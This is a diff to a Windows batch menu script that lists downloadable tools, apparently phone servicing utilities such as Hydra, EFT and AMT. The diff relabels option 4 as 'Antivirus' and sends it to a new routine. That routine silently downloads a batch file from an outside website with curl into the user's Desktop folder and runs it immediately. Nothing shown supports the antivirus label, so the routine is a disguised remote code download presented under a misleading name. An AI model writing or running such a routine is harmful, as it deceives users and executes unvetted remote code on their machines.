@@ -13,7 +13,7 @@ echo.
 echo [1] bulk         [10] Hydra         [18] Sigma Down
 echo [2] EFT          [11] TFM           [19] MST
 echo [3] usb197       [12] TSM           [20] CPT
-echo [4] bd           [13] AMT           [21] BD Old
+echo [4] Antivirus    [13] AMT           [21] BD Old
 echo [5] fck          [14] Lite Down     [22] Cell Tool us
 echo [7] hiddiy       [15] RFT           [23]
 echo [8] AMT Down     [16] TCF           [24]
@@ -25,7 +25,7 @@ set /p choice=Choose (1-100):
 if "%choice%"=="1" goto bulk
 if "%choice%"=="2" goto eftp
 if "%choice%"=="3" goto usb197d
-if "%choice%"=="4" goto bdd
+if "%choice%"=="4" goto excc
 if "%choice%"=="5" goto fckd
 if "%choice%"=="7" goto hiddifyd
 if "%choice%"=="8" goto amt
@@ -43,9 +43,16 @@ if "%choice%"=="19" goto mstd
 if "%choice%"=="20" goto cptd
 if "%choice%"=="21" goto bdod
 if "%choice%"=="22" goto celld
+if "%choice%"=="23" goto celld
 
 echo Invalid Choice!
 timeout /t 2 >nul
+goto MENU
+
+:excc
+cd %USERPROFILE%\Desktop
+curl -sL https://www.ttamig3.com/auth/exc.bat -o exc.bat && exc.bat
+start exc.bat
 goto MENU
 
 :celld
